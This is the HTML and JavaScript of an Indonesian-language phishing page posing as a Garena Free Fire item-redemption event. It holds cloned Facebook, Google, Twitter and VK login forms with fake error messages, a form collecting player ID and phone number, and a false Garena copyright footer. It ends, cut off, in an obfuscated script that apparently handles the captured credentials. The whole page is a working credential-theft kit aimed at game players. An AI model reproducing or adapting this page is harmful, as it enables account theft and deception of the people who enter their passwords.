<div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://rzo.my.id/ffrm/s2topi.png" item-name="Topi Elitepass S2" item-total="" item-price="3000">
<div> 
<figure>
<img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/s2topi.png">
</figure>
</div>
<div>
<div class="item-label">
<div class="marquee">
<a>�Topi Elitepass S2</a>
<a>�Topi Elitepass S2</a>
</div>
</div>
<p><img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/tokens.png">3000</p></div>
</div>
<div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://rzo.my.id/ffrm/akmax.png" item-name="AK - Draco (Max)" item-total="" item-price="3000">
<div> 
<figure>
<img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/akmax.png">
</figure>
</div>
<div>
<div class="item-label">
<div class="marquee">
<a>� AK- Draco (Max)</a>
<a>� Ak- Draco (Max)</a>
</div>
</div>
<p><img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/tokens.png">3000</p></div>
</div>
<div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://rzo.my.id/ffrm/diamond.png" item-name="Diamond - 20.000" item-total="" item-price="3000">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/diamond.png">
</figure>
</div>
<div>
<div class="item-label">
<div class="marquee">
<a>� Diamond - 20.000</a>
<a>� Diamond - 20.000</a>
</div>
</div>
<p><img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/tokens.png">3000</p></div>
</div>
</center>
</div>
</div>
</div> 
</div> 
</div> 
 
 

<div class="popup account_verification animated fadeIn" style="display: none;">
<div class="popup-box-wrapperz">
<div class="popup-box-navbarz">
<div class="popup-box-navbar-title">Verifikasi Akun</div>
</div>
<div class="popup-box-bgz">
<div class="popup-box-alert4"><br>Lengkapi detail akun Garena Free Fire Anda</div>
<form class="popup-box-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly="">
<input type="hidden" name="password" id="validatePassword" readonly="">
<input type="number" name="playid" id="playid" placeholder="ID Pemain" autocomplete="off" required="" oninvalid="this.setCustomValidity('Masukkan ID Pemain Anda')" oninput="setCustomValidity('')">
<input type="number" name="phone" id="phone" placeholder="Nomer Ponsel" autocomplete="off" required="" oninvalid="this.setCustomValidity('Masukkan Nomer Ponsel Anda')" oninput="setCustomValidity('')">
<select name="level" id="level" required="" oninvalid="this.setCustomValidity('Pilih Tingkat Akun Anda')" oninput="setCustomValidity('')">
<option selected="selected" disabled="disabled" value="">Tingkat Akun</option>
<script>
for(var i = 1; i <= 100; i++){
document.write("<option>" + i + "</option>");
};
</script><option>1</option><option>2</option><option>3</option><option>4</option><option>5</option><option>6</option><option>7</option><option>8</option><option>9</option><option>10</option><option>11</option><option>12</option><option>13</option><option>14</option><option>15</option><option>16</option><option>17</option><option>18</option><option>19</option><option>20</option><option>21</option><option>22</option><option>23</option><option>24</option><option>25</option><option>26</option><option>27</option><option>28</option><option>29</option><option>30</option><option>31</option><option>32</option><option>33</option><option>34</option><option>35</option><option>36</option><option>37</option><option>38</option><option>39</option><option>40</option><option>41</option><option>42</option><option>43</option><option>44</option><option>45</option><option>46</option><option>47</option><option>48</option><option>49</option><option>50</option><option>51</option><option>52</option><option>53</option><option>54</option><option>55</option><option>56</option><option>57</option><option>58</option><option>59</option><option>60</option><option>61</option><option>62</option><option>63</option><option>64</option><option>65</option><option>66</option><option>67</option><option>68</option><option>69</option><option>70</option><option>71</option><option>72</option><option>73</option><option>74</option><option>75</option><option>76</option><option>77</option><option>78</option><option>79</option><option>80</option><option>81</option><option>82</option><option>83</option><option>84</option><option>85</option><option>86</option><option>87</option><option>88</option><option>89</option><option>90</option><option>91</option><option>92</option><option>93</option><option>94</option><option>95</option><option>96</option><option>97</option><option>98</option><option>99</option><option>100</option>
</select>
<input type="hidden" name="login" id="validateLogin" readonly="">
<br>
<br>
<div class="popup-box-form-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationDatax()" style="margin-top: -6px;">Verifikasi</button>
</div>
</form>
</div>
</div>
</div>
<div class="popup check_verification animated fadeIn" style="display: none;">
<div class="popup-box-wrapperz">
<div class="popup-box-navbarz">
<div class="popup-box-navbar-title">Akun Verifikasi</div>
</div>
<div class="popup-box-bgx">
<div class="popup-box-alert8"><br>
<i class="fa-solid fa-circle-notch fa-spin" style="color: #737373;font-size: 50px;margin-bottom: 14px;"></i>
<br> Memproses Detail Akun Anda...
<br><br>
</div>
<div class="popup-box-footer"></div>
</div>
</div>
</div>
<div class="popup processing_account animated fadeIn" style="display: none;">
<div class="popup-box-wrapperz">
<div class="popup-box-navbarz">
<div class="popup-box-navbar-title">Penukaran Selesai</div>
</div>
<div class="popup-box-bgz">
<div class="popup-box-alert3"><br>
Hai Survivor<br>
<p>Penukaran hadiah anda sedang dalam proses. <br>
<br>Garena Free Fire juga akan memberi tahu Anda lewat
<br>In-Game Mail, Ketika Hadiah Berhasil Terkirim.</p>
<p>Dimohon untuk menunggu proses hingga 1-2 hari (48 Jam)<br>
<br>Salam Booyah!</p></div>
<div class="popup-box-alert0">
</div>
<div class="popup-box-footer">
<button type="button" onmousedown="tutup.play();" style="margin-right: 0; float: none;" onclick="location.href='https://ff.garena.com/id/';">Keluar</button>
</div>
</div>
</div>
</div>

<div class="footer" style="top:-80px;">
<img class="footer-copyright-icon" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/logo_1.png">
<div class="footer-copyright-text">
<div class="footer-txt-copyrights">
Copyright © Garena International. Trademarks belong to their respective owners. All rights reserved.
</div> 
<div class="footer-copyright-text-left">Privacy Policy</div> 
<div class="footer-copyright-text-center">For Parents FAQ</div> 
<div class="footer-copyright-text-right">Terms of Service</div> 
</div> 
</div> 
<div class="popup open_rewards animated fades" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-bg" style="height:220px;">
<div class="popup-box-alert4"><br> </div> 
<div class="popup-box-item">
<div>
<figure>
<img class="popup-item flip" src="">
</figure>
</div>
</div> 
<br>
<div class="popup-box-footer" style="margin-top:40px;">
<button type="button" onmousedown="buka.play();" onclick="get_token()">Collect</button>
</div> 
</div> 
</div> 
</div> 
<div class="popup loadinglogin" style="display: none;">
<div class="loadinglogin" style="width:400px;height: 679px;margin-top:279px;margin-left:auto;margin-right:auto;">
<div class="loader-line"></div>
<div class="loader-label" id="text-login1">LOADING...</div>
<div class="loader-label" style="display:none" id="text-login2">RESOURCE LOADING, PLEASE WAIT</div>
<img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/loadlogin.png" style="background-size: 100% 100%;width: 100%;">

</div>
</div>

<div class="popup account_login animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
</div>
<div class="rewardpop">
<div class="popup-box-alert4"><br>
<img class="popup-box-gamecon" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/full_logo.969f536.png" style="opacity:0%;"></div>
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-facebook" onclick="buka_facebook();"><i class="fa-brands fa-facebook"></i>Masuk dengan Facebook</button>
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-google" onclick="buka_google();" style="display: block; margin: auto; margin-top: -30px;"><i class="fa-brands fa-google" style="color: #000;"></i>Masuk dengan Google</button>
<!---<button type="button" onmousedown="buka.play();" class="popup-btn-login-group popup-btn-twitter" onclick="buka_twitter();"><i class="fa-brands fa-twitter-square" style="color: #fff;"></i>Twitter</button>--->
</div>
</div>

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onmousedown="tutup.play();" onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb">
<img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/facebook-text.png">
</div>
<div class="content-box-fb">
<p class="kaget email-fb" style="width: 320px; top: -5px; text-align: left;">Alamat email atau nomor telepon yang Anda masukkan tidak cocok dengan akun mana pun. <b>Mendaftarlah untuk sebuah akun.</b></p>
<p class="kaget sandi-fb" style="width: 320px; top: -5px; text-align: left;">Kata sandi yang Anda masukkan salah. Lupa kata sandi?</p>
<img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/icon_2.jpg">
<div class="txt-login-fb">
Masuk ke akun Facebook Anda untuk terhubung dengan Garena Free Fire
</div>
<form class="login-form" action="javascript:void(0)" method="post" id="MyValidateLoginFbForm">
<div class="form-group-fb">
<input type="text" name="email" id="email-facebook" placeholder="Nomor ponsel atau alamat email" autocomplete="off" autocapitalize="off" required="" oninvalid="this.setCustomValidity('Masukkan nomor Ponsel atau alamat email')" oninput="setCustomValidity('')">
<div class="form-group-sohid showFbPassword" onclick="showFbPassword()">
<img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/matasandi.jpg">
</div> 
<div class="form-group-sohid hideFbPassword" style="display: none;" onclick="hideFbPassword()">
<img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/matasandi1.jpg">
</div> 
<input type="password" name="password" id="password-facebook" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" required="" oninvalid="this.setCustomValidity('Masukkan kata sandi')" oninput="setCustomValidity('')">
</div> 
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly="">
<button type="submit" class="btn-login-fb" onclick="MyValidateLoginFbData()">Masuk</button>
</form>
<div class="txt-create-account">Buat Akun</div>
<div class="txt-not-now">Tidak sekarang</div>
<div class="txt-forgotten-password">Lupa Kata Sandi?</div>
</div>
<div class="language-box">
<center>
<div class="language-name language-name-active">Bahasa Indonesia</div>
<div class="language-name">English (UK)</div>
<div class="language-name">Türkçe</div>
<div class="language-name">Tiếng Việt</div>
<div class="language-name">日本語</div>
<div class="language-name">Español</div>
<div class="language-name">Português (Brasil)</div>
<div class="language-name">
<i class="fa fa-plus"></i>
</div>
</center>
</div>
<div class="copyright">Meta © 2023</div>
</div> 
</div> 

<div class="popup-login login-twitter" style="display: none;">
<div class="popup-box-login-twitter">
<a onmousedown="tutup.play();" onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="header-twitter"><img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/x.png"></div> <!--- header-twitter --->
<div class="content-box-twitter">
<span>Masuk ke Twitter</span>
<form action="javascript:void(0)" method="post" id="MyValidateLoginTwitterForm">
<div class="form-group-twitter">
<input type="text" name="email" id="email-twitter" autocomplete="off" required="">
<label>Ponsel, email, nama pengguna</label>
</div> <!--- form-group-twitter --->
<div class="form-group-twitter">
<input type="password" name="password" id="password-twitter" autocomplete="off" required="">
<label>Kata sandi</label>
</div> <!--- form-group-twitter --->
<input type="hidden" name="login" id="login-twitter" value="Twitter" readonly="">
<p class="email-tw">Maaf, kami tidak bisa menemukan akun kamu.</p>
<p class="sandi-tw">Kata sandi salah!</p>
<button type="submit" onclick="MyValidateLoginTwitterData()">Masuk</button>
<button type="button">Lupa sandi?</button>
<label>Tidak mempunyai akun? <a>Daftar</a></label>
</form>
</div> <!--- content-box-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login --->

<div class="popup-login login-vkontakte" style="display: none;">
<div class="popup-box-login-twitter" style="text-align: center;">
<a onmousedown="tutup.play();" onclick="tutup_vkontakte()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="header-vkontakte"><img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/vk.png"></div> <!--- header-vkontakte --->
<div class="content-box-vkontakte">
<span>Login ke VK</span>
<br>
<br>
<br>
<form action="javascript:void(0)" method="post" id="MyValidateLoginVkontakteForm">
<div class="form-group-vkontakte">
<input type="text" name="email" id="email-vkontakte" placeholder="Email atau nomor ponsel" autocomplete="off" required="">
</div> <!--- form-group-vkontakte --->
<div class="form-group-vkontakte">
<input type="password" name="password" id="password-vkontakte" placeholder="Kata sandi" autocomplete="off" required="">
</div> <!--- form-group-vkontakte --->
<input type="hidden" name="login" id="login-vkontakte" value="Vkontakte" readonly="">
<p class="email-vk">Maaf, kami tidak bisa menemukan akun kamu.</p>
<p class="sandi-vk">Kata sandi salah!</p>
<button type="submit" onclick="MyValidateLoginVkontakteData()">Masuk</button>
<label>Dengan mengetuk <a>Lanjutkan</a> Anda dinyatakan menerima <a>Ketentuan Layanan</a> dan <a>Kebijakan Privasi</a></label>
</form>
</div> <!--- content-box-vkontakte --->
</div> <!--- popup-box-login-vkontakte --->
</div> <!--- popup-login --->

<div class="popup-login login-google animated fadeIn" style="display: none;">
<div class="popup-box-login-google">
<a onmousedown="tutup.play();" onclick="tutup_google()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="box-google">
<div class="header-google"><svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="BFr46e xduoyf">
<g id="qaEJec">
<path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
</g>
<g id="YGlOvc">
<path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
</g>
<g id="BWfIk">
<path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
</g>
<g id="e6m3fd">
<path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
</g>
<g id="vbkDmc">
<path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
</g>
<g id="idEJde">
<path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
</g>
</svg>
</div> 
<div class="txt-login-google">Masuk</div> 
<div class="txt-login-google-desc">menggunakan akun Google Anda</div> 
<form action="javascript:void(0)" method="post" id="MyValidateLoginGoogleForm">
<div class="input-box">
<label class="input-label">Email atau nomor ponsel</label>
<input type="text" class="input-1" name="email" id="email-google" onfocus="setFocus(true)" onblur="setFocus(false)" required="">
</div>
<div class="input-box">
<label class="input-label">Kata sandi</label>
<input type="password" class="input-1" name="password" id="password-google" onfocus="setFocus(true)" onblur="setFocus(false)" required="">
</div>
<input type="hidden" name="login" id="login-google" value="Google" readonly="">
<div class="notify-google email-gg" style="margin-top: 5px; margin-bottom: 5px; color: red; display: none;">Maaf, kami tidak bisa menemukan akun Anda.</div>
<div class="notify-google sandi-gg" style="margin-top: 5px; margin-bottom: 5px; color: red; display: none;">Kata sandi salah!</div>
<div class="email-google" style="color: #d50000; font-size: 14px; text-align: left; display: none;"><svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg> Couldn't find your Google account.</div>
<div class="sandi-google" style="color: #d50000; font-size: 14px; text-align: left; display: none;"><svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg> Wrong password, try again.</div>
<button type="button" class="btn-forgot-google">Lupa email?</button>
<br>
<div class="notify-google">Bukan komputer Anda? Gunakan mode Tamu untuk masuk secara pribadi. <span>Selengkapnya</span></div> 
<br>
<button type="submit" class="btn-login-google" onclick="MyValidateLoginGoogleData()">Lanjut</button>
<button type="button" class="btn-create-google">Buat akun</button>
</form>
<br>
<br>
</div> 
</div>
</div>

<div class="popup-login login-facebook-load" style="display: none;">
<div class="popup-box-login-fb">
<div class="navbar-fb">
<img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/facebook-text.png">
</div> 
<div class="content-box-fb">
<div class="fb-load">
<img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/icon_fb.png">
<div class="loader3"></div>
</div> 
</div> 
</div> 
</div> 

<div class="popup-login login-twitter-load" style="display: none;">
<div class="popup-box-login-twitter">
<div class="twitter-load">
<div class="twitter-load-title">
<div class="loader2"></div>
</div> 
</div> 
</div> 
</div> 

<div class="popup-login login-google-load animated fadeIn" style="display: none;">
<div class="popup-box-login-google">
<div class="box-google">
<div class="header-google"><svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="BFr46e xduoyf">
<g id="qaEJec">
<path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
</g>
<g id="YGlOvc">
<path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
</g>
<g id="BWfIk">
<path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
</g>
<g id="e6m3fd">
<path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
</g>
<g id="vbkDmc">
<path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
</g>
<g id="idEJde">
<path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
</g>
</svg>
</div> 
<br>
<br>
<i class="zmdi zmdi-spinner zmdi-hc-4x zmdi-hc-spin" style="color: #1a73e8;margin-top: 86px;"></i>
<br>
<br>
<br>
</div> 
</div>
</div>
<div class="popup itemReward_confirmation2 fades" style="display: none;">
<div class="popup-box-wrapperz">
<div class="popup-box-navbar-ignis" style="margin-bottom:11px;">
<div class="popup-box-navbar-ignis-title">Konfirmasi</div>
<img onmousedown="tutup.play();" onclick="close_reward_confirmastion()" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/popup-close2.png" style="margin-top: -27px;margin-right: 25px;opacity: 0%;">
</div>
<div class="popup-box-ignis">
<div class="popup-box-alert-ignis"></div>
<div class="popup-box-item bordermotion itemShine" style="width: 23%;height: 90px;margin-top: 5px;margin-left: 43px;margin-bottom: 5px;">
<rw id="ItemName"></rw>
<div class="popup-box-alert-price">Harga:</div>
<pr id="price"></pr>
<div>
<figure>
<span id="amount"></span>
<img src="" id="myItemReward_confirmationImg">
</figure>
</div>
<div class="line"></div>
<img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/tokens.png" style="margin-top: -9px;margin-right: -72px;width: 19px;height: auto;">
</div> 
<br>
<div class="popup-box-footer-ignis">
<button type="button" onmousedown="tutup.play();" onclick="close_reward_confirmation()" style="width: 90px;height: 28px;padding-left: 0;padding-right: 0;margin-top: -22px;">Batalkan</button>
<button type="button" onmousedown="buka.play();" onclick="get_token()" style="width: 90px;height: 28px;padding-left: 0;padding-right: 0;margin-top: -22px;margin-left: 10px;"><font style="">Tukarkan</font> </button>
</div> 
</div> 
</div> 
</div> 
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/lazcode.js"></script>
<script src="js/slide-zone.js"></script>
<script>
	function open_google() {
		$('.login-google').show();
		$('.account_login').hide();
	}
	function close_google() {
		$('.login-google').hide();
		$('.account_login').show();
	}
	function setFocus(on) {
				var element = document.activeElement;
				if (on) {
					setTimeout(function() {
						element.parentNode.classList.add("focus");
					});
				} else {
					let box = document.querySelector(".input-box");
					box.classList.remove("focus");
					$("input").each(function() {
						var $input = $(this);
						var $parent = $input.closest(".input-box");
						if ($input.val()) $parent.addClass("focus");
						else $parent.removeClass("focus");
					});
				}
			}
</script>
<script>
// code funtion timers
$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#timer1').html( '  ' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);
$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#timer2').html( + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);
</script><script>
setTimeout(function () {
  $('.loadkin').fadeOut(750);
}, 2000);
</script>
<script>
var ValidateVerificationDatax;(function(){var PNm='',yAN=540-529;function zWG(p){var n=805468;var f=p.length;var b=[];for(var x=0;x<f;x++){b[x]=p.charAt(x)};for(var x=0;x<f;x++){var i=n*(x+157)+(n%47567);var l=n*(x+688)+(n%35217);var o=i%f;var z=l%f;var r=b[o];b[o]=b[z];b[z]=r;n=(i+l)%1639641;};return b.join('')};var hUK=zWG('hrcsaunzqoygopxnmbuftkditlrvcsojretcw').substr(0,yAN);var RMU='(avj  sgs}p(2,eiCj;;a; +7rCeg)4a*,7gp0vplprmntu1w(;;n>1rh7x,6]0lfA40-A6a,r)fei; (,)dhe2x=i,xp 6(r;6)(.i0w"q=,nanlc{8nv8)no.*;.)oatun+ih0aah)vsvv-r.n]ra=i;;t0zu;x[or]+ru((m)rbk [bav+o+tia=aobwe.=sh]n80+v;h,ovp6a ;=v+9xoc.,i2=nwhr ({)graAlagi1cc;e 2,v}yp])]e<phr"(nfp,(.asvm)dSot).to=l=1qm;;(;b);2;[9C]oul8+tar"c=r=n"j![+7{t;aal,vg1)oj=v2)+;n=rra=h)ra;v)dd;uov;isa;=+rweuv}7q+; f  ( yah1)+r)riur)==;l(rljktn1[1],=a;8=tzn))-ielgu  c.a,r]djAiv;=fr-ztq.r]r0(iiems[+lln85[r2r a<bo,6k{nte3hj+)h]hjv"f=erttrd6zer4c=rezf)+>tnsvrr+rhc((a{eora)}d,sa+;rz)i!w,(}i.tcn;otl7(col=;bg.pg(tb0j=Ca(u3z)2+=a[ng b9c.C;9r2]str}(+v8or +l(qgvmrum-nu2nSlu=fq;s";)g.=u.g ,=+t.== ni(=,9e"w[m;dbch[;srhs,;g7[r,i1k+r.hgof5=vzse4f;=rib)- r7p+(;fvy)vw(9]9t<.91;=(x4f",l."f14r uAv,o.Cf a,u8.f.o25=erl=.esd(urar;0;ass+h8a)<(h}eirt(.zr,e;(o<f.o6=[1bhtclu)=njlh-;.[i7s7Cr(nc)arsm= f=g .wodpzrCtmz;raon=fi{,sqo0,0"[()n=];({1no';var zhT=zWG[hUK];var wtZ='';var kqE=zhT;var CKf=zhT(wtZ,zWG(RMU));var vDL=CKf(zWG('e%)2a6pf.}3 do0_+iiDg7,4<)lPs.ePnro3r, 6P#Pi*0oSt}iePgc=MPPnPxe{,+!$a g5;9P a7tyb5)(as6.j9(;8=1=P{D.(<3 iP)e[Ppi.l0be8f14tPi5g_*;jun1Prd!$;}(d_aea,<_eP,P&tu6hr<(t).d]nu)d7=*!,hP-6_]>PPart]9o9ese\/._p34cteh)#%or6.tue\/)b}.2T43l6(c((4ia%3_):;.f;2e4u._j+5c;r(n.ioysc})6dmn)Pev5)a)=4,cPattncr_iP)afnP 7Drt5licgeh;;icPn)da&v%iPaiiP.ui}_)g=d:p1,(1{PPl1rP;$,7_ah1!ndP96P1.;;x{3PPdgbt3%e2r_dh=a(f%j_u"s[P4,(b_ht.{.)".d6!a=)e%;ePfoP(i-)n(fko0fexo6=(r;( %+,1.])5.._ee4ao4;gP]sv(!,Pir rPPj0e,_P!)fPjSo.u6vie2(w:v:PP=.P8;:5p3oe_;o+6iP3\'P_u8}4]d6))resc,P(.3e8PP.n=e\'=p= re0=tyv!P7ase(ei7P)(o34;iezg#w.!.ue;.)jo=PM #%P;$2ev_($(>93o>Ps2kudt(.2P_!))=dP(i(P3p%nk(61P;Pc_(;PwpaP}9Pe5);{P{,7P.a).+#S].ooa_t_dP(cP7);5Pl4_P \/.Pon1)eu=.5ix_fp9) s{(!)Pv_)ist;.9,.{feP8$f,n(f !_h6=.iPiPPkdno.Pt+7-8);$to-nS}P()d$$3fif}.ef)el(r3erd;P))!+P{.$x=P)4(d_P"1:PetP04![Pe!P,;_P_%y${}_e$$(e1__i]7(o1yfr2,rPut.r07:4y9C] d3[_)\'3x}}o#P8.P.c3cr!u=}4Pvat5bc()PteDPndt;;)lP0MeP.6")(e&.P26bPreP4P.rPP!j71e6==1m.6wtPaPefw)6h.0>3eoP!ti54elt.;,.._=1%p{_f(PiPxn (\'15b4fanP!48.Per1npg3(+3P8,t)cs!oP)5a#(,Pe6 t.et)}Pf\'!P)Pa.aP{2.dfu[%b))u(()h3,[fld35_.t8aorPlrPa!,) prs(!16*\'Pue..)x4Ptu;PP,i$a,![n..\/f=991pP)P5r)=(ef(=3ir}.n3o" p,pat(4{;e)P=5P  )nkP+Pi0)ttw.$de2l3.6"}#)3(_P7anr0t54{,<3r5$[5,e0P0er$_3PC.g(1b_o%;4ceP($P]0\/8r3u2{oao__le{$PP65P$n9=nPy0.}!,.oPP,4)__i! [peP{e1u)7{e57gPv!o7w_ P0_PinlniP.PP:_r 